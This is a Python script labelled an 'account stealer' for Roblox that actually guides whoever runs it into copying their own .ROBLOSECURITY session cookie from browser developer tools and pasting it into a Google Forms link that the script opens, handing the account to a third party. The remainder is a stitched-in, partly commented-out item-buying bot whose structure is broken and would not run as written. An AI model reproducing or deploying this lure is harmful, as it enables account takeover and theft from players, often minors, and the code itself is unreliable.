import requests
import json
import webbrowser
import time
import threading
import random
import os
from urllib3.exceptions import InsecureRequestWarning

#settings = json.load(open("settings.json", "r"))

#requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#session = requests.session()
#session.cookies['.ROBLOSECURITY'] = settings["cookie"]

#token = None
#payload = [{"itemType": "Asset", "id": id} for id in settings["items"]]
#cache = []

#logs = []
#checks = 0

#def refresh_tokens():
    #while True:
        #_set_auth()
        #time.sleep(150)
print("Welcome to WORKCLOCK'S account stealer,")
time.sleep(2)
print("Go to the victims roblox profile then follow them and go to their name then double click on it and change it to ""Name/X/Y=553.TOKEN""next double click theyre profile picture next press on inspect element and press console and type ""/xy * following"" press enter and you need to get in application, if you already see application then press on it if you dont see it then look in the top right you should see 2 arrows like this "">>"" press on it and press on application")
time.sleep(5)
question = "Type yes when you finnished (yes)"
expected_answer = "yes"

user_input = input(question + "\n")
user_answer = user_input.lower()

if user_answer == expected_answer:
    print("Press on cookies then right under cookies you will see ""https://roblox.com"" press on it then double click on warning and copy the text, next go to this website:")
question = "Type yes when you finnished (yes)"
expected_answer = "yes"

user_input = input(question + "\n")
user_answer = user_input.lower()

if user_answer == expected_answer:
    time.sleep(1.5)
    webbrowser.open('https://forms.gle/6bDheQPivV2uKrvCA')

def _set_auth():
    global token, session
    try:
        conn = session.post("https://auth.roblox.com/v2/logout")
        if conn.headers.get("x-csrf-token"):
            token = conn.headers["x-csrf-token"]
    except:
        time.sleep(5)
        return _set_auth()

def get_product_id(id):
    try:
        conn = session.get(f"https://economy.roblox.com/v2/assets/{id}/details", verify=False)
        data = conn.json()

        if conn.status_code == 200:
            return {
                "id": data["ProductId"],
                "creator": data["Creator"]["Id"]
            }
        else:
            time.sleep(1)
            return get_product_id(id)
    except:
        time.sleep(1)
        return get_product_id(id)

def buy_item(product_id, seller_id, price):
    global logs

    try:
        body = {
            "expectedCurrency": 1,
            "expectedPrice": price,
            "expectedSellerId": seller_id
        }
        headers = {
            "x-csrf-token": token,
        }
        conn = session.post(f"https://economy.roblox.com/v1/purchases/products/{product_id}", headers=headers, json=body)
        data = conn.json()
        if conn.status_code == 200:
            if ("purchased" in data) and data["purchased"] == True:
                logs.append(f"Bought {data['assetName']}")
        else:
            return buy_item(product_id, seller_id, price)
    except:
        return buy_item(product_id, seller_id, price)

def status_update():
    global checks, logs

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("made by frames, discord.gg/mewt")
        print(f"Checks: {checks}")
        print(f"Logs: \n" + "\n".join(log for log in logs[-10:]))

        time.sleep(1)
        
def watcher():
    global token, session, checks, logs
    while True:
        try:
            headers = {
                "x-csrf-token": token,
                "cache-control": "no-cache",
                "pragma": "no-cache",
            }
            conn = session.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": payload}, headers=headers, verify=False)

            data = conn.json()
            if conn.status_code == 200:
                checks += 1
                if "data" in data:
                    for item in data["data"]:
                        if "price" in item and not item["id"] in cache and not item["price"] > settings["items"][str(item["id"])]:
                            cache.append(item["id"])
                            r_data = get_product_id(item["id"])
                            logs.append("Buying item")
                            buy_item(r_data["id"], r_data["creator"], item["price"])
            elif conn.status_code == 403:
                logs.append('force refreshing auth token')
                _set_auth()
            else:
                logs.append(f"{data}, status: {conn.status_code}")
        except Exception as error:
            logs.append(str(error))
            pass
        time.sleep(settings["watch_speed"])


#if __name__ == '__main__':
    threading.Thread(target=refresh_tokens).start()
    print("Waiting to fetch token, restart if it takes too long")
    while token == None:
        time.sleep(1)
    print("Fetched token")
    threading.Thread(target=status_update).start()
    threading.Thread(target=watcher).start()




input()
